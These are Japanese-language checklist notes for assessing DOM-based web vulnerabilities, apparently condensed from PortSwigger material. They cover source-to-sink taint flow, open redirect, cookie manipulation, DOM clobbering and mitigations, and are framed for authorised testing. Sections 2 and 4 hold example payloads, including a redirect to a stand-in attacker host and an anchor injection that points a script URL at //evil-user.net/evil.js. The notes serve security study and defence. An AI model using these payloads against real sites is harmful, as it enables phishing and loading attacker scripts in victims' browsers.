# DOMベース脆弱性(全般) 診断チェックリスト

PortSwigger Web Security Academy の解説を読み、診断の手順として組み直したノートです。原文は転載していません。詳しい説明や演習は出典を見てください。DOM XSS固有の診断は別ノート「XSS」を参照。ここではXSS以外の形で現れるDOMベース脆弱性を扱う。

診断は、自分の管理下の環境か、書面で許可を得た対象にだけ行います。

## 1. 前提知識(taint flow)

DOMベース脆弱性は、攻撃者が制御できる値(**ソース**)が、危険な処理(**シンク**)にそのまま渡ることで起きる。XSSはその一例にすぎず、シンクの種類によって様々な脆弱性に分岐する。

### 代表的なソース

`document.URL`、`document.documentURI`、`document.baseURI`、`location`系(`search`、`hash`など)、`document.cookie`、`document.referrer`、`window.name`、`history.pushState`/`replaceState`、`localStorage`/`sessionStorage`、IndexedDB、反射・格納されたデータ、Webメッセージ(`postMessage`で受け取ったデータ)。

### シンクと脆弱性の対応

| 脆弱性 | 代表的なシンク |
|---|---|
| DOM XSS | `document.write()` |
| オープンリダイレクト | `window.location` |
| Cookie操作 | `document.cookie` |
| JavaScriptインジェクション | `eval()` |
| document.domain操作 | `document.domain` |
| WebSocket URLポイズニング | `WebSocket()` |
| リンク操作 | `element.src` |
| Webメッセージ操作 | `postMessage()` |
| Ajaxリクエストヘッダ操作 | `setRequestHeader()` |
| ローカルファイルパス操作 | `FileReader.readAsText()` |
| クライアント側SQLインジェクション | `ExecuteSql()` |
| HTML5ストレージ操作 | `sessionStorage.setItem()` |
| クライアント側XPathインジェクション | `document.evaluate()` |
| クライアント側JSONインジェクション | `JSON.parse()` |
| DOMデータ操作 | `element.setAttribute()` |
| サービス拒否(DoS) | `RegExp()` |

この表は「この関数が使われていれば即脆弱」という意味ではない。同じ関数でも、渡す値が固定文字列だったり、事前に十分検証された値だったりすれば安全な場合がある。ソースの値が、安全化されずにシンクまで届く(taint flowが成立する)ことまで確認して、はじめて脆弱性といえる。

## 2. オープンリダイレクト(DOMベース)

スクリプトが、攻撃者制御の値を、クロスドメインの遷移を起こせるシンク(`location`、`location.href`、`open()`など)に書き込んでいる場合。

```javascript
let url = /https?:\/\/.+/.exec(location.hash);
if (url) { location = url[0]; }
```

`https://normal-website.com/example#https://evil-user.net` のようなURLで、`location.hash`に外部URLを埋め込み、被害者のブラウザをそこへ遷移させる。本物のドメイン・有効なTLS証明書のURLから始まるため、フィッシングの踏み台として使われやすい(ユーザーがURLを確認しても、その後のリダイレクト先までは見ないことが多い)。

遷移先文字列の先頭を制御できる場合、`javascript:`疑似プロトコルでJavaScriptインジェクションに発展することもある。

## 3. Cookie操作(DOMベース)

スクリプトが、攻撃者制御の値を`document.cookie`にそのまま書き込んでいる場合。

```javascript
document.cookie = 'cookieName='+location.hash.slice(1);
```

単体では低リスクに見えるが、攻撃チェーンの一部として使われることがある。

- Cookieがアプリの挙動(本番モード/デモモードの切り替えなど)を制御している場合、意図しない動作を引き起こせる。
- Cookieがセッション追跡に使われている場合、**セッション固定攻撃**に使える可能性がある。これは、攻撃者が取得した値を被害者のCookieに書き込めるだけでは成立せず、**サーバー側がログイン後もそのセッションIDをローテーションせず、有効なセッションとして引き続き受け入れる**ことが条件になる。同じ親ドメイン配下の別サイトにも影響しうる。JavaScriptから`HttpOnly`属性付きのCookieを直接上書きすることはできない点にも注意する(同名でも別のpath/domainのCookieを新規作成できる場合はあり、その場合の優先順位はブラウザ・サーバーの実装に依存する)。

さらに、Cookieの値がHTMLエンコードなしで応答に反映される実装では、Cookie操作とXSSを組み合わせた攻撃チェーンにもなる。

## 4. DOM Clobbering

HTMLインジェクションは可能だが、`<script>`タグの実行(通常のXSS)が使えない状況で、`id`や`name`属性がフィルタの許可リストに入っている場合に使える。HTML要素を注入して、JavaScriptが参照するグローバル変数やDOMプロパティを「上書き(clobber)」する。

### 4-1. グローバル変数の上書き

次のようなよくあるパターンを狙う。

```javascript
let someObject = window.someObject || {};
```

`someObject`が未定義の場合に空オブジェクトへフォールバックするこのコードに対し、同じIDを持つ複数の`<a>`タグを注入すると、ブラウザがそれらをDOMコレクションとしてグループ化し、`someObject`の参照がこのコレクションに上書きされる。

```html
<a id=someObject><a id=someObject name=url href=//evil-user.net/evil.js>
```

最後のアンカーに`name=url`を付けることで、`someObject.url`プロパティ(動的に読み込むスクリプトのURLなど)を外部ドメインに差し替えられる。

### 4-2. フィルタのバイパス

`attributes`プロパティのような、JavaScriptのフィルタロジックが依存するDOMプロパティ自体を上書きする手口もある。

```html
<form onclick=alert(1)><input id=attributes>Click me
```

フィルタが`form`要素の`attributes`プロパティをループして危険な属性(`onclick`など)を除去しようとするが、`attributes`が`input`要素(未定義のlengthを持つ)で上書きされているため、ループの条件が満たされず、除去処理自体が素通りする。結果、`onclick`イベントが残ったまま通過してしまう。

## 5. 誤検知・見落としやすい点

- オープンリダイレクトは、`location`系の多くのプロパティ・メソッド(`location.pathname`、`XMLHttpRequest.open()`など)が対象になる。1つの形で見つからなくても、他のシンクを試す。
- Cookie操作は、Cookie自体を変えられることの深刻度を、そのCookieが何を制御しているか(単なる表示設定か、セッション管理か)で評価する。
- DOM Clobberingは、`id`/`name`属性だけが許可されている(タグ自体やイベント属性は厳しくフィルタされている)状況で特に有効。フィルタの許可リストにこれらの属性が含まれているか確認する。
- 「`window.x || {}`」のようなOR演算子によるフォールバックパターンは、DOM Clobberingの典型的な狙い目。コードレビューでこの形を見つけたら要注意。

## 6. 対策(開発側への指摘事項)

- 信頼できないソースからのデータを、動的にシンクへ流し込まない設計を基本にする。
- 避けられない場合は、クライアント側コードで、許可リスト方式の検証か、適切なサニタイズ・エンコード(JavaScript・HTML・URLエンコードを文脈に応じて組み合わせる)を行う。
- DOM Clobbering対策として、オブジェクト・関数が期待する型であることを明示的に確認する(例: `attributes`プロパティが本当に`NamedNodeMap`のインスタンスか確認する)。
- グローバル変数とOR演算子(`||`)を組み合わせたフォールバックパターンのコードを避ける。
- DOMPurifyのような、DOM Clobberingへの対策が組み込まれた、十分にテストされたライブラリを使う。
